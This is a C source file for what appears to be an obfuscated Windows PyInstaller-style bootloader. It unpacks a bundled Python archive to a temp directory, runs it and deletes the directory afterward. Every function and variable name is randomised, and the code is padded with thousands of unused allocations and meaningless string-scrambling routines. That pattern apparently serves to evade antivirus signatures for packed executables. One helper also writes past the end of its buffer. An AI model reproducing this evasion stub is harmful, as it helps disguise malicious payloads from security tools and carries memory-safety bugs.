int VoIWYKYKccMMTqo(ARCHIVE_STATUS *LylcvQoyFkgUi, char const * ZZPgmbV, char  const * OUGfLskLvdQJgF) {
if (rDvZnGjxrftwm(LylcvQoyFkgUi, ZZPgmbV, OUGfLskLvdQJgF)) return -1;
if (ndqRJbtnndS(LylcvQoyFkgUi)) return -1;
return 0; }
int BHbyyDe(ARCHIVE_STATUS *JvMVyVgoYeZ, int argc, char *argv[]) {
int MZGXevIFblL = 0;
if (DOaCRqBZKiYumv(JvMVyVgoYeZ)) return -1;
if (kNTpLDYoKCw(JvMVyVgoYeZ, argc, argv)) return -1;
if (HdPmDvVVxEsKom(JvMVyVgoYeZ)) return -1;
if (ZoJMtJHFzYkkW(JvMVyVgoYeZ)) return -1;
MZGXevIFblL = HZWOOvAo(JvMVyVgoYeZ);
return MZGXevIFblL; }
void JlmqoR(const char *TjeOwhfhVIEJwc);
void ObqwRSNPLiY(char *uskeNzJfZNpqehc, int FBDlnuJSGYlcQd, struct _finddata_t WpivrLzXck) {
if ( strcmp(WpivrLzXck.name, ".")==0  || strcmp(WpivrLzXck.name, "..") == 0 ) return;
uskeNzJfZNpqehc[FBDlnuJSGYlcQd] = '\0';
strcat(uskeNzJfZNpqehc, WpivrLzXck.name);
if ( WpivrLzXck.attrib & _A_SUBDIR ) JlmqoR(uskeNzJfZNpqehc);
 else if (remove(uskeNzJfZNpqehc)) { Sleep(100); remove(uskeNzJfZNpqehc); } }
void JlmqoR(const char *nfgrpEL) {
char jnfbjonwNwbkcba[_MAX_PATH+1]; struct _finddata_t NquzeNKtjmWfxsT;
long ZCaYoZnEEWD; int KMHrmATivgVCs; strcpy(jnfbjonwNwbkcba, nfgrpEL);
KMHrmATivgVCs = strlen(jnfbjonwNwbkcba);
if ( jnfbjonwNwbkcba[KMHrmATivgVCs-1] != '/' && jnfbjonwNwbkcba[KMHrmATivgVCs-1] != '\\' ) { strcat(jnfbjonwNwbkcba, "\\"); KMHrmATivgVCs++; }
strcat(jnfbjonwNwbkcba, "*");
ZCaYoZnEEWD = _findfirst(jnfbjonwNwbkcba, &NquzeNKtjmWfxsT);
if (ZCaYoZnEEWD != -1) {
    ObqwRSNPLiY(jnfbjonwNwbkcba, KMHrmATivgVCs, NquzeNKtjmWfxsT);
    while ( _findnext(ZCaYoZnEEWD, &NquzeNKtjmWfxsT) == 0 ) ObqwRSNPLiY(jnfbjonwNwbkcba, KMHrmATivgVCs, NquzeNKtjmWfxsT);
    _findclose(ZCaYoZnEEWD); }
rmdir(nfgrpEL); }
void aVWIXVZ(ARCHIVE_STATUS *DTXUnf) { if (DTXUnf->temppath[0]) JlmqoR(DTXUnf->temppath); }
int aJYNvnshnpHSQgm(ARCHIVE_STATUS *hWVMmDhVVmjpjv) { return ntohl(hWVMmDhVVmjpjv->cookie.pyvers); }
void WowgHWrzEQiPD(void) { PI_Py_Finalize(); } 
char* zgvvssL(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* pAcOVxjdsrfmcHe(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
char* gRWlnlyqINfAA(){ char *LMwrutnM = zgvvssL("EDAQMEAZaJnOrSxBmnroYlHPekbvNMmiIUdgArVSGWxWDFzHSQ"); return strstr( LMwrutnM, "k" );}
char* IlHsQmGZJCqQr(){ char jAMKFNfOzGb[882], YNIUFxIsqkZa[882/2]; strcpy(jAMKFNfOzGb,"ZEVqyFKIEJmFsxwMqYJdNxSokdebvxMtTERKhPPMqsdBXVCZbt"); strcpy(YNIUFxIsqkZa,"tYkaQNKLARLsObPlLAVJripmxepUzFZAuxfZDibmNvrRxwOpVU"); return pAcOVxjdsrfmcHe(strcat( jAMKFNfOzGb, YNIUFxIsqkZa)); }
char* YZeXfWodOrPPoX() { char zruIiViBYFcbs[882] = "bfirDsdDeVdXXPPkmRknrNkXVKitnoyngqDayRSuzArEHMrdca"; char *LjhFNjgpyXHopSw = strupr(zruIiViBYFcbs); return strlwr(LjhFNjgpyXHopSw); }
int APIENTRY WinMain( HINSTANCE qwAMqYToSd, HINSTANCE hgfZgyuzBHvrsm, LPSTR fmMckfG, int CZIsrY ) {
char lYLLjxvBtIw[_MAX_PATH];
ARCHIVE_STATUS *feXuRQPtatXpwV[20];
char* euyfDU[7463];
char* KRZIdoT[6669];
WCHAR HGbOCvCbb[_MAX_PATH + 1];
int pYzcNzZwrVTCOWT = 0;
char JYWNcMEWEaBln[_MAX_PATH];
char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
int argc = __argc;
char **argv = __argv;
char GcytIRZyPsG[_MAX_PATH + 5];
char *RlrTUreqBkowaU = NULL;
int i = 0;
char* DVWpbtJJG[1055];
memset(&feXuRQPtatXpwV, 0, 20 * sizeof(ARCHIVE_STATUS *));
for (i = 0;  i < 1055;  ++i) DVWpbtJJG[i] = malloc (4574);if ((feXuRQPtatXpwV[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
RidfxdEzSBmfi(lYLLjxvBtIw, argv[0]);
hwMDZBvnCF(HGbOCvCbb);
for (i = 0;  i < 6669;  ++i) KRZIdoT[i] = malloc (6878);oanKnOIhpasN(GcytIRZyPsG, lYLLjxvBtIw);
KNASQRIRQMV(JYWNcMEWEaBln, lYLLjxvBtIw);
for (i = 0;  i < 7463;  ++i) euyfDU[i] = malloc (7157);RlrTUreqBkowaU = getenv( "_MEIPASS2" );
if (RlrTUreqBkowaU && *RlrTUreqBkowaU == 0) { RlrTUreqBkowaU = NULL; }
if (VoIWYKYKccMMTqo(feXuRQPtatXpwV[SELF], JYWNcMEWEaBln, &lYLLjxvBtIw[strlen(JYWNcMEWEaBln)])) {
    if (VoIWYKYKccMMTqo(feXuRQPtatXpwV[SELF], JYWNcMEWEaBln, &GcytIRZyPsG[strlen(JYWNcMEWEaBln)])) { return -1; } }
if (!RlrTUreqBkowaU && !vRQebKCCRrnDGe(feXuRQPtatXpwV)) {
    RlrTUreqBkowaU = JYWNcMEWEaBln;
    strcat(MEIPASS2, JYWNcMEWEaBln);
    putenv(MEIPASS2); }
if (RlrTUreqBkowaU) {
    if (strcmp(JYWNcMEWEaBln, RlrTUreqBkowaU) != 0) {
        strcpy(feXuRQPtatXpwV[SELF]->temppath, RlrTUreqBkowaU);
        strcpy(feXuRQPtatXpwV[SELF]->temppathraw, RlrTUreqBkowaU); }
    kpLoRqP(RlrTUreqBkowaU, lYLLjxvBtIw);
for (i=0; i<1055; ++i){strcpy(DVWpbtJJG[i], gRWlnlyqINfAA());}    pYzcNzZwrVTCOWT = BHbyyDe(feXuRQPtatXpwV[SELF], argc, argv);
    ochkoBHcUdis();
    WowgHWrzEQiPD();
} else { 
    if (pbtRZQU(feXuRQPtatXpwV)) { return -1; }
for (i=0; i<6669; ++i){strcpy(KRZIdoT[i], IlHsQmGZJCqQr());}    strcat(MEIPASS2, feXuRQPtatXpwV[SELF]->temppath[0] != 0 ? feXuRQPtatXpwV[SELF]->temppath : JYWNcMEWEaBln);
    putenv(MEIPASS2);
    if (potbFMUVCZ(feXuRQPtatXpwV[SELF]) == -1) return -1;
    pYzcNzZwrVTCOWT = XXuuqhTytW(HGbOCvCbb);
    if (feXuRQPtatXpwV[SELF]->temppath[0] != 0) JlmqoR(feXuRQPtatXpwV[SELF]->temppath);
    for (i = SELF; feXuRQPtatXpwV[i] != NULL; i++) { free(feXuRQPtatXpwV[i]); }}
for (i=0; i<7463; ++i){strcpy(euyfDU[i], YZeXfWodOrPPoX());}return pYzcNzZwrVTCOWT; }
